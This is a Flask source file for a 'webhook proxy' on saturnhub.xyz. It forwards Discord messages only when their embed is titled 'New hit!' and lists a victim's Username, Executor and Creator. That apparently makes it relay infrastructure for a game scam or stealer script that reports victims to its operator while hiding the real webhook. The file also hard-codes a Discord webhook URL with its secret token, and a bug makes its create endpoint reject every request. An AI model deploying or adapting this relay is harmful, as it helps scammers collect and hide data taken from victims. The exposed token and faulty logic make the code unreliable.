from flask import Flask, request, jsonify
from flask_cors import CORS
import requests, time, string, random, os

app = Flask(__name__)
CORS(app)

webhook_map = {}  # token → real Discord webhook
ip_registry = {}  # token+IP → last timestamp
LIMIT_SECONDS = 3600  # One message per IP per hour

def generate_token(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

@app.route("/")
def home():
    return """
    <h1>✅ Webhook Proxy is Running on <code>saturnhub.xyz</code></h1>
    <p>Use <code>POST /create</code> with your Discord webhook to generate a proxy URL.</p>
    <p>Then send requests to your generated link:</p>
    <code>https://saturnhub.xyz/webhook/&lt;token&gt;</code>
    """

@app.route("/create", methods=["POST"])
def create_webhook():
    data = request.json
    real_webhook = data.get("https://discord.com/api/webhooks/1347215407857270804/xJu0x9KyAtq4B3535P9SdaBvN0FVBzaqPfk59_mLcf6PpSfZWkgq0d9GeQK5vmw_8DKx")

    if not real_webhook or "discord.com/api/webhooks/" not in real_webhook:
        return jsonify({"error": "Invalid Discord webhook URL"}), 400

    token = generate_token()
    webhook_map[token] = real_webhook

    # Force it to use your real domain
    base_url = "https://saturnhub.xyz"
    return jsonify({"proxy_url": f"{base_url}/webhook/{token}"})

@app.route("/webhook/<token>", methods=["POST"])
def handle_webhook(token):
    if token not in webhook_map:
        return jsonify({"error": "Invalid token"}), 404

    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    key = f"{token}:{client_ip}"

    if key in ip_registry and time.time() - ip_registry[key] < LIMIT_SECONDS:
        return jsonify({
            "error": "Rate limited",
            "time_remaining": int(LIMIT_SECONDS - (time.time() - ip_registry[key]))
        }), 429

    data = request.json
    if not data or "embeds" not in data:
        return jsonify({"error": "Missing or invalid 'embeds'"}), 400

    allowed = False
    for embed in data["embeds"]:
        if embed.get("title", "").strip() == "New hit!\nWhen ingame say anything in the chat to recive the stuff":
            for field in embed.get("fields", []):
                if field.get("name") == "Player Info":
                    value = field.get("value", "")
                    if all(x in value for x in ["Username:", "Executor:", "Creator:"]):
                        allowed = True
                        break

    if not allowed:
        return jsonify({"error": "Embed content not allowed"}), 400

    ip_registry[key] = time.time()
    real_webhook = webhook_map[token]
    response = requests.post(real_webhook, json=data)

    return jsonify({
        "status": "sent",
        "discord_status": response.status_code
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))  # Render sets the port env var
    app.run(host="0.0.0.0", port=port)
